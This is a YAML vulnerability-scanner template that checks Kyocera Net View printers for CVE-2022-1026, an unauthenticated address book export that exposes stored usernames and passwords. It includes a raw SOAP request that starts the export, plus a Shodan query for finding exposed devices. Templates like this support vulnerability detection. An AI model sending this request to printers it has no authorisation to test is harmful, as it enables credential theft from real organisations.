templates/CVE-2022-1026.yaml

http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - SOAP-ENV:Envelope
    - SOAP-ENV:Body
  - part: content_type
    type: word
    words:
    - text/xml
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /ws/km-wsdl/setting/address_book HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/soap+xml


    <?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope"
    xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"
    xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action
    SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>

    '
id: CVE-2022-1026
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:kyocera:net_viewer:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-1026
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-522
    epss-percentile: 0.99436
    epss-score: 0.87671
  description: 'Kyocera multifunction printers running vulnerable versions of Net
    View unintentionally expose sensitive user information, including usernames and
    passwords, through an insufficiently protected address book export function.

    '
  impact: 'Unauthenticated attackers can export the address book from Kyocera printers
    containing sensitive user information including usernames and passwords without
    authentication.

    '
  metadata:
    max-request: 1
    product: net_viewer
    shodan-query: product:"Kyocera Printer Panel"
    vendor: kyocera
  name: Kyocera Net View Address Book Exposure
  reference:
  - https://github.com/ac3lives/kyocera-cve-2022-1026
  - https://www.rapid7.com/blog/post/2022/03/29/cve-2022-1026-kyocera-net-view-address-book-exposure/
  remediation: 'Apply firmware updates provided by Kyocera or configure authentication
    for the address book export function.

    '
  severity: high
  tags: cve,cve2022,kyocera,exposure,vkev,vuln
